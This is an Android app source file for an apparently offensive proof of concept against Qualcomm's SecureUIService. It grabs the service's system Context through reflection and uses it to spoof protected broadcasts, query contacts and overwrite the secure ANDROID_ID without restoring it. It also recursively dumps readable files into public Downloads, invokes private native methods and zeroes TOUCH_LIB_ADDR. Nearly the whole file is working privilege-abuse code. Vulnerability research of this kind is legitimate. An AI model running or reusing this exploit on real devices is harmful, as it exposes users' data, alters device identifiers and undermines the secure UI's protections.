package com.example.tzpoc;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "SecureUIPoC";
    private static final String TEST_DATA = "POC_WRITE_TEST_DATA_12345";
    private static final String TEST_FILENAME = "poc_write_test.tmp";
    private static final long MAX_FILE_SIZE_FOR_DUMP = 10 * 1024 * 1024; // 10MB
    private static final int MAX_DEPTH = 6;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    // SecureUI から取得したシステムコンテキストとクラス
    private Context systemContext;
    private Class<?> secureUIClass;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                acquireSecureUIContextAndClass();
                startTests();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("SecureUI PoC started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void acquireSecureUIContextAndClass() {
        try {
            secureUIClass = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            Field contextField = secureUIClass.getDeclaredField("context");
            contextField.setAccessible(true);
            systemContext = (Context) contextField.get(null);
            if (systemContext != null) {
                appendLog("SecureUIService.context acquired via reflection");
            } else {
                appendLog("SecureUIService.context is null");
            }
        } catch (Exception e) {
            appendLog("Failed to acquire SecureUI context: " + e.getMessage());
            systemContext = null;
            secureUIClass = null;
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    // ==================== メインテスト実行 ====================
    private void executeFullTest() {
        // Phase 1: ファイルシステム探索（読み取り）
        appendLog("========== PHASE 1: File System Exploration ==========");
        exploreDeepFiles();

        // Phase 2: 通常の Settings 書き込み試行
        appendLog("========== PHASE 2: Normal Settings Write ==========");
        testSettingsWrite();

        // Phase 3: SecureUI SystemContext を用いた高度な操作
        appendLog("========== PHASE 3: SecureUI SystemContext Advanced ==========");
        if (systemContext != null) {
            testSecureUISpecific();
        } else {
            appendLog("SystemContext not available, skipping Phase 3");
        }

        // Phase 4: 書き込み検証（直接 FileOutputStream）
        appendLog("========== PHASE 4: Write Verification (direct) ==========");
        performWriteVerification();

        // Phase 5: 再帰的ファイルダンプ（読み取り＋コピー）
        appendLog("========== PHASE 5: Recursive File Dump ==========");
        if (systemContext != null) {
            recursiveDumpFiles();
        } else {
            appendLog("SystemContext not available, skipping dump");
        }

        // Phase 6: id コマンド（プロセスコンテキスト）
        appendLog("========== PHASE 6: Process context (id) ==========");
        testIdCommand();

        // Phase 7 以降：SecureUI 深掘りリフレクション
        if (secureUIClass != null) {
            // Phase 7: 全フィールド列挙と操作
            appendLog("========== PHASE 7: SecureUI Field Enumeration & Manipulation ==========");
            testSecureUIFields();

            // Phase 8: 全メソッド（public/private）呼び出し
            appendLog("========== PHASE 8: SecureUI Method Invocation (Reflection) ==========");
            testSecureUIMethods();

            // Phase 9: TOUCH_LIB_ADDR 書き換えと sendNotification テスト
            appendLog("========== PHASE 9: TOUCH_LIB_ADDR Modification ==========");
            testTouchLibAddrManipulation();

            // Phase 10: OrientationActivity 制御（起動・終了）
            appendLog("========== PHASE 10: OrientationActivity Control ==========");
            testOrientationActivityControl();

            // Phase 11: 内部状態（rotation 等）の読み取り・変更
            appendLog("========== PHASE 11: Internal State (rotation, etc.) ==========");
            testInternalState();

            // Phase 12: CallReceiver / ScreenReceiver 静的メソッド呼び出し
            appendLog("========== PHASE 12: Receiver Utilities ==========");
            testReceiverUtils();

            // Phase 13: 未公開リソース（R.string）へのアクセス
            appendLog("========== PHASE 13: Resource Access (R.string) ==========");
            testResourceAccess();

            // Phase 14: システム権限でのブロードキャスト偽装（再）
            appendLog("========== PHASE 14: Spoofed Broadcasts ==========");
            testSpoofedBroadcasts();
        } else {
            appendLog("SecureUIClass not available, skipping Phase 7-14");
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    // ==================== フェーズ1: ファイル探索 ====================
    private void exploreDeepFiles() {
        appendLog("--- Deep file exploration ---");
        String[] paths = {
                "/proc/self/fd", "/proc/self/maps", "/proc/self/smaps",
                "/proc/self/comm", "/proc/self/limits", "/proc/self/statm",
                "/system/build.prop", "/system/etc/hosts", "/vendor/build.prop",
                "/proc/version"
        };
        for (String p : paths) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }
        File tmp = new File("/data/local/tmp");
        if (tmp.exists() && tmp.canRead()) {
            appendLog("Contents of /data/local/tmp:");
            for (File f : tmp.listFiles()) {
                if (f != null) appendLog("  " + f.getName());
            }
        }
    }

    private void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) { appendLog(path + " does not exist"); return; }
        if (!f.canRead()) { appendLog(path + " not readable"); return; }
        if (f.isDirectory()) {
            appendLog(path + " is a directory");
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[4096];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("Content of " + path + ": " + content);
            } else {
                appendLog("Empty file: " + path);
            }
        } catch (Exception e) {
            appendLog("Error reading " + path + ": " + e.getMessage());
        }
    }

    // ==================== フェーズ2: Settings 書き込み ====================
    private void testSettingsWrite() {
        appendLog("--- Normal Settings Write (without system context) ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded!");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("Settings error: " + e.getMessage());
        }
    }

    // ==================== フェーズ3: SystemContext 応用 ====================
    private void testSecureUISpecific() {
        appendLog("--- SecureUI: Broadcast send ---");
        try {
            Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
            intent.setPackage("com.qualcomm.qti.services.secureui");
            systemContext.sendBroadcast(intent);
            appendLog("Broadcast ACTION_CLOSE sent");
        } catch (Exception e) {
            appendLog("Broadcast failed: " + e.getMessage());
        }
        try {
            Intent phoneIntent = new Intent("android.intent.action.PHONE_STATE");
            phoneIntent.putExtra("state", "RINGING");
            systemContext.sendBroadcast(phoneIntent);
            appendLog("Fake PHONE_STATE broadcast sent");
        } catch (Exception e) {
            appendLog("PHONE_STATE failed: " + e.getMessage());
        }

        appendLog("--- SecureUI: Start activity ---");
        try {
            Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            systemContext.startActivity(settingsIntent);
            appendLog("Settings activity started");
        } catch (Exception e) {
            appendLog("StartActivity failed: " + e.getMessage());
        }

        appendLog("--- SecureUI: ContentProvider query ---");
        ContentResolver cr = systemContext.getContentResolver();
        try (Cursor c = cr.query(Settings.Global.CONTENT_URI, null, null, null, null)) {
            appendLog("Settings.Global query: " + (c != null ? "count=" + c.getCount() : "null"));
        } catch (Exception e) {
            appendLog("Settings query error: " + e.getMessage());
        }
        try (Cursor c = cr.query(Uri.parse("content://contacts/people"), null, null, null, null)) {
            appendLog("Contacts query: " + (c != null ? "count=" + c.getCount() : "null"));
        } catch (Exception e) {
            appendLog("Contacts query error: " + e.getMessage());
        }

        appendLog("--- SecureUI: Write Secure Settings ---");
        try {
            boolean result = Settings.Secure.putString(systemContext.getContentResolver(),
                    Settings.Secure.ANDROID_ID, "POC_TEST_ID");
            appendLog("Write Secure.ANDROID_ID result: " + result);
        } catch (Exception e) {
            appendLog("Write Secure error: " + e.getMessage());
        }

        appendLog("--- SecureUI: File write via ContentResolver ---");
        try {
            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File testFile = new File(download, "systemcontext_write_test.txt");
            Uri fileUri = Uri.fromFile(testFile);
            try (java.io.OutputStream os = systemContext.getContentResolver().openOutputStream(fileUri)) {
                if (os != null) {
                    os.write("Written via SystemContext".getBytes(StandardCharsets.UTF_8));
                    appendLog("Write succeeded: " + testFile.getAbsolutePath());
                } else {
                    appendLog("openOutputStream returned null");
                }
            }
        } catch (Exception e) {
            appendLog("File write error: " + e.getMessage());
        }
    }

    // ==================== フェーズ4: 書き込み検証 (WriteResult) ====================
    private static class WriteResult {
        String path;
        boolean canWrite, writeSuccess, readVerifySuccess, deleteSuccess;
        String errorMessage;
        WriteResult(String path) { this.path = path; }
        @Override
        public String toString() {
            return String.format(Locale.US,
                    "Path: %s\n  canWrite()=%b, write=%b, verify=%b, delete=%b%s",
                    path, canWrite, writeSuccess, readVerifySuccess, deleteSuccess,
                    errorMessage != null ? " (error: " + errorMessage + ")" : "");
        }
    }

    private void performWriteVerification() {
        String[] dirs = {
                "/data/local/tmp", "/data/misc", "/data/system", "/data/data",
                "/cache", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                "/dev", "/proc", "/sys", "/system", "/"
        };
        for (String d : dirs) {
            if (stopRequested.get()) break;
            WriteResult result = new WriteResult(d);
            try {
                File dir = new File(d);
                if (!dir.exists()) {
                    result.errorMessage = "Directory does not exist";
                    appendLog(result.toString());
                    continue;
                }
                result.canWrite = dir.canWrite();
                File testFile = new File(dir, TEST_FILENAME);
                boolean writeOk = writeFile(testFile, TEST_DATA);
                result.writeSuccess = writeOk;
                if (!writeOk) {
                    result.errorMessage = "Write failed";
                    appendLog(result.toString());
                    continue;
                }
                boolean verifyOk = verifyFile(testFile, TEST_DATA);
                result.readVerifySuccess = verifyOk;
                if (verifyOk) {
                    result.deleteSuccess = testFile.delete();
                }
            } catch (Exception e) {
                result.errorMessage = "Unexpected: " + e.getMessage();
                Log.e(TAG, "Error " + d, e);
            }
            appendLog(result.toString());
        }
    }

    private boolean writeFile(File file, String data) {
        try {
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(data.getBytes(StandardCharsets.UTF_8));
                fos.flush();
                return true;
            }
        } catch (Exception e) {
            return false;
        }
    }

    private boolean verifyFile(File file, String expected) {
        if (!file.exists()) return false;
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[expected.length() + 10];
            int len = fis.read(buffer);
            if (len <= 0) return false;
            String actual = new String(buffer, 0, len, StandardCharsets.UTF_8);
            return expected.equals(actual);
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== フェーズ5: 再帰的ダンプ ====================
    private void recursiveDumpFiles() {
        appendLog("--- Recursive file dump from / ---");
        File outputBase = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (!outputBase.exists() && !outputBase.mkdirs()) {
            appendLog("Cannot create Download dir");
            return;
        }
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        File dumpDir = new File(outputBase, "dump_" + timestamp);
        if (!dumpDir.exists() && !dumpDir.mkdirs()) {
            appendLog("Cannot create dump dir");
            return;
        }
        appendLog("Dumping to: " + dumpDir.getAbsolutePath());
        long start = System.currentTimeMillis();
        AtomicBoolean err = new AtomicBoolean(false);
        walkAndDump(new File("/"), dumpDir, 0, err);
        appendLog("Dump finished in " + (System.currentTimeMillis() - start) + " ms, errors=" + err.get());
    }

    private void walkAndDump(File dir, File outputDir, int depth, AtomicBoolean err) {
        if (stopRequested.get()) return;
        if (depth > MAX_DEPTH) return;
        if (!dir.exists() || !dir.canRead()) {
            appendLog("Cannot read: " + dir.getAbsolutePath());
            return;
        }
        File[] children = dir.listFiles();
        if (children == null) return;
        for (File child : children) {
            if (stopRequested.get()) break;
            try {
                if (child.isDirectory()) {
                    walkAndDump(child, outputDir, depth + 1, err);
                } else {
                    if (child.canRead() && child.length() <= MAX_FILE_SIZE_FOR_DUMP) {
                        copyFileToDump(child, outputDir);
                    } else {
                        appendLog("Skip: " + child.getAbsolutePath() + (child.canRead() ? " (too large)" : " (not readable)"));
                    }
                }
            } catch (Exception e) {
                appendLog("Error: " + child.getAbsolutePath() + " - " + e.getMessage());
                err.set(true);
            }
        }
    }

    private void copyFileToDump(File src, File outputDir) {
        String rel = src.getAbsolutePath().replace("/", "_");
        if (rel.length() > 200) rel = rel.substring(0, 200);
        File dest = new File(outputDir, rel + ".dump");
        if (dest.exists()) return;
        try (FileInputStream fis = new FileInputStream(src);
             FileOutputStream fos = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) > 0) fos.write(buf, 0, len);
            appendLog("Copied: " + src.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Copy failed: " + src.getAbsolutePath() + " - " + e.getMessage());
        }
    }

    // ==================== フェーズ6: id コマンド ====================
    private void testIdCommand() {
        appendLog("--- Executing 'id' ---");
        Process process = null;
        BufferedReader reader = null;
        try {
            process = Runtime.getRuntime().exec("id");
            reader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) out.append(line).append("\n");
            int exit = process.waitFor();
            appendLog("id output:\n" + out.toString());
            appendLog("exit code: " + exit);
            if (out.toString().contains("uid=0")) appendLog("** WARNING: root **");
            else if (out.toString().contains("uid=1000")) appendLog("** system (uid=1000) **");
            else appendLog("** normal user (expected) **");
        } catch (Exception e) {
            appendLog("id failed: " + e.getMessage());
        } finally {
            if (reader != null) try { reader.close(); } catch (Exception ignored) {}
            if (process != null) process.destroy();
        }
    }

    // ==================== フェーズ7: フィールド列挙・操作 ====================
    private void testSecureUIFields() {
        appendLog("--- Enumerating all fields of SecureUIService ---");
        try {
            Field[] fields = secureUIClass.getDeclaredFields();
            for (Field f : fields) {
                if (stopRequested.get()) break;
                f.setAccessible(true);
                String mod = Modifier.toString(f.getModifiers());
                String type = f.getType().getSimpleName();
                String name = f.getName();
                Object value = null;
                try {
                    value = f.get(null); // static or null for instance? ここではstaticのみを対象に、インスタンスはnullを渡す
                    // インスタンスフィールドはget(null)で例外が出るのでキャッチ
                } catch (IllegalArgumentException e) {
                    // インスタンスフィールドの場合は、インスタンスが必要。ここではスキップ
                    value = "<instance field>";
                } catch (Exception e) {
                    value = "<error: " + e.getMessage() + ">";
                }
                appendLog("Field: " + mod + " " + type + " " + name + " = " + value);
            }
        } catch (Exception e) {
            appendLog("Field enumeration error: " + e.getMessage());
        }
    }

    // ==================== フェーズ8: メソッド呼び出し（リフレクション） ====================
    private void testSecureUIMethods() {
        appendLog("--- Invoking methods via reflection ---");
        // メソッド一覧 (メソッド名, 引数型, 戻り値, ダミー引数)
        Object[][] methods = {
                {"init", new Class<?>[]{}, int.class, new Object[]{}},
                {"terminate", new Class<?>[]{}, int.class, new Object[]{}},
                {"sendResponse", new Class<?>[]{int.class, int.class, byte[].class}, int.class, new Object[]{0, 0, new byte[32]}},
                {"getdispprop", new Class<?>[]{int.class, int.class, byte[].class, byte[].class}, int.class, new Object[]{0, 0, new byte[32], new byte[32]}},
                {"secuienqueue", new Class<?>[]{int.class, int.class, byte[].class, byte[].class}, int.class, new Object[]{0, 0, new byte[32], new byte[32]}},
                {"secuidequeue", new Class<?>[]{int.class, int.class, byte[].class, byte[].class}, int.class, new Object[]{0, 0, new byte[32], new byte[32]}},
                {"startdisp", new Class<?>[]{int.class, int.class, byte[].class, byte[].class}, int.class, new Object[]{0, 0, new byte[32], new byte[32]}},
                {"stopdisp", new Class<?>[]{int.class, int.class, byte[].class, byte[].class}, int.class, new Object[]{0, 0, new byte[32], new byte[32]}},
                {"getSource", new Class<?>[]{}, byte[].class, new Object[]{}},
                {"sendNotification", new Class<?>[]{int.class, int.class, byte[].class}, int.class, new Object[]{2, 15, new byte[32]}},
                {"setRotation", new Class<?>[]{int.class}, void.class, new Object[]{16}},
        };
        for (Object[] m : methods) {
            if (stopRequested.get()) break;
            String name = (String) m[0];
            Class<?>[] paramTypes = (Class<?>[]) m[1];
            Class<?> retType = (Class<?>) m[2];
            Object[] args = (Object[]) m[3];
            try {
                Method method = secureUIClass.getDeclaredMethod(name, paramTypes);
                method.setAccessible(true);
                Object result = method.invoke(null, args);
                String resultStr = (result == null) ? "null" : result.toString();
                if (result instanceof byte[]) {
                    resultStr = "byte[" + ((byte[]) result).length + "]";
                }
                appendLog("Method " + name + " returned: " + resultStr);
            } catch (NoSuchMethodException e) {
                appendLog("Method " + name + " not found");
            } catch (Exception e) {
                String cause = (e.getCause() != null) ? e.getCause().getMessage() : e.getMessage();
                appendLog("Method " + name + " threw: " + cause);
            }
        }
        // 特別に waitForMessage をタイムアウト付きでテスト
        try {
            Method waitMethod = secureUIClass.getDeclaredMethod("waitForMessage", byte[].class);
            waitMethod.setAccessible(true);
            byte[] input = new byte[32];
            ExecutorService exec = Executors.newSingleThreadExecutor();
            Future<?> future = exec.submit(() -> {
                try {
                    return waitMethod.invoke(null, (Object) input);
                } catch (Exception e) {
                    return e;
                }
            });
            Object result = future.get(2000, TimeUnit.MILLISECONDS);
            if (result instanceof byte[]) {
                appendLog("waitForMessage returned byte[" + ((byte[]) result).length + "]");
            } else {
                appendLog("waitForMessage result: " + result);
            }
            exec.shutdownNow();
        } catch (Exception e) {
            appendLog("waitForMessage test failed: " + e.getMessage());
        }
    }

    // ==================== フェーズ9: TOUCH_LIB_ADDR 操作 ====================
    private void testTouchLibAddrManipulation() {
        appendLog("--- Manipulating TOUCH_LIB_ADDR ---");
        try {
            Field field = secureUIClass.getDeclaredField("TOUCH_LIB_ADDR");
            field.setAccessible(true);
            byte[] original = (byte[]) field.get(null);
            appendLog("Original TOUCH_LIB_ADDR: " + bytesToHex(original));
            // 書き換え
            byte[] malicious = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            field.set(null, malicious);
            appendLog("Modified TOUCH_LIB_ADDR to zeros");
            // sendNotification を呼び出してみる (static)
            try {
                Method sendNotif = secureUIClass.getMethod("sendNotification", int.class, int.class, byte[].class);
                int result = (int) sendNotif.invoke(null, 2, 15, malicious);
                appendLog("sendNotification with modified addr returned: " + result);
            } catch (Exception e) {
                appendLog("sendNotification failed: " + e.getMessage());
            }
            // 元に戻す
            field.set(null, original);
            appendLog("Restored TOUCH_LIB_ADDR");
        } catch (Exception e) {
            appendLog("TOUCH_LIB_ADDR manipulation error: " + e.getMessage());
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }

    // ==================== フェーズ10: OrientationActivity 制御 ====================
    private void testOrientationActivityControl() {
        appendLog("--- Launching OrientationActivity ---");
        try {
            Intent intent = new Intent();
            intent.setClassName("com.qualcomm.qti.services.secureui",
                    "com.qualcomm.qti.services.secureui.OrientationActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (systemContext != null) {
                systemContext.startActivity(intent);
                appendLog("OrientationActivity launched via systemContext");
            } else {
                startActivity(intent);
                appendLog("OrientationActivity launched via normal context");
            }
            // 少し待って閉じる
            Thread.sleep(1000);
            Intent closeIntent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
            closeIntent.setPackage("com.qualcomm.qti.services.secureui");
            if (systemContext != null) {
                systemContext.sendBroadcast(closeIntent);
                appendLog("Sent ACTION_CLOSE via systemContext");
            } else {
                sendBroadcast(closeIntent);
                appendLog("Sent ACTION_CLOSE via normal context");
            }
        } catch (Exception e) {
            appendLog("OrientationActivity control error: " + e.getMessage());
        }
    }

    // ==================== フェーズ11: 内部状態 (rotation) ====================
    private void testInternalState() {
        appendLog("--- Reading internal state (rotation) ---");
        try {
            Field rotationField = secureUIClass.getDeclaredField("rotation");
            rotationField.setAccessible(true);
            int rotation = rotationField.getInt(null);
            appendLog("Current rotation = " + rotation);
            // 変更を試みる
            rotationField.setInt(null, 48);
            appendLog("Set rotation to 48");
            int newRotation = rotationField.getInt(null);
            appendLog("New rotation = " + newRotation);
            // 元に戻す
            rotationField.setInt(null, rotation);
            appendLog("Restored rotation to " + rotation);
        } catch (Exception e) {
            appendLog("Internal state error: " + e.getMessage());
        }
    }

    // ==================== フェーズ12: Receiver ユーティリティ ====================
    private void testReceiverUtils() {
        appendLog("--- CallReceiver.callActive() ---");
        try {
            Class<?> callReceiver = Class.forName("com.qualcomm.qti.services.secureui.CallReceiver");
            Method callActive = callReceiver.getMethod("callActive");
            boolean active = (boolean) callActive.invoke(null);
            appendLog("callActive() = " + active);
        } catch (Exception e) {
            appendLog("CallReceiver error: " + e.getMessage());
        }
        appendLog("--- ScreenReceiver.screenOn() ---");
        try {
            Class<?> screenReceiver = Class.forName("com.qualcomm.qti.services.secureui.ScreenReceiver");
            Method screenOn = screenReceiver.getMethod("screenOn");
            boolean on = (boolean) screenOn.invoke(null);
            appendLog("screenOn() = " + on);
        } catch (Exception e) {
            appendLog("ScreenReceiver error: " + e.getMessage());
        }
    }

    // ==================== フェーズ13: リソースアクセス ====================
    private void testResourceAccess() {
        appendLog("--- Accessing R.string resources ---");
        try {
            Class<?> rClass = Class.forName("com.qualcomm.qti.services.secureui.R$string");
            Field[] fields = rClass.getDeclaredFields();
            for (Field f : fields) {
                if (stopRequested.get()) break;
                try {
                    int resId = f.getInt(null);
                    String resName = f.getName();
                    // システムコンテキストを使って文字列を取得
                    if (systemContext != null) {
                        String str = systemContext.getString(resId);
                        appendLog("R.string." + resName + " = \"" + str + "\" (id=" + resId + ")");
                    } else {
                        appendLog("R.string." + resName + " id=" + resId + " (no context)");
                    }
                } catch (Exception e) {
                    appendLog("Error accessing field " + f.getName() + ": " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("Resource access error: " + e.getMessage());
        }
    }

    // ==================== フェーズ14: 偽装ブロードキャスト ====================
    private void testSpoofedBroadcasts() {
        appendLog("--- Spoofing protected broadcasts ---");
        if (systemContext == null) {
            appendLog("No systemContext, skipping");
            return;
        }
        // BOOT_COMPLETED を偽装
        try {
            Intent bootIntent = new Intent("android.intent.action.BOOT_COMPLETED");
            bootIntent.setPackage("com.qualcomm.qti.services.secureui");
            systemContext.sendBroadcast(bootIntent);
            appendLog("Spoofed BOOT_COMPLETED sent");
        } catch (Exception e) {
            appendLog("BOOT_COMPLETED spoof failed: " + e.getMessage());
        }
        // SCREEN_OFF を偽装
        try {
            Intent screenOff = new Intent("android.intent.action.SCREEN_OFF");
            screenOff.setPackage("com.qualcomm.qti.services.secureui");
            systemContext.sendBroadcast(screenOff);
            appendLog("Spoofed SCREEN_OFF sent");
        } catch (Exception e) {
            appendLog("SCREEN_OFF spoof failed: " + e.getMessage());
        }
        // ACTION_SHUTDOWN を偽装
        try {
            Intent shutdown = new Intent("android.intent.action.ACTION_SHUTDOWN");
            shutdown.setPackage("com.qualcomm.qti.services.secureui");
            systemContext.sendBroadcast(shutdown);
            appendLog("Spoofed ACTION_SHUTDOWN sent");
        } catch (Exception e) {
            appendLog("ACTION_SHUTDOWN spoof failed: " + e.getMessage());
        }
    }

    // ==================== ログ・UI ====================
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "secureui_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== SecureUI PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        saveLog();
    }
}
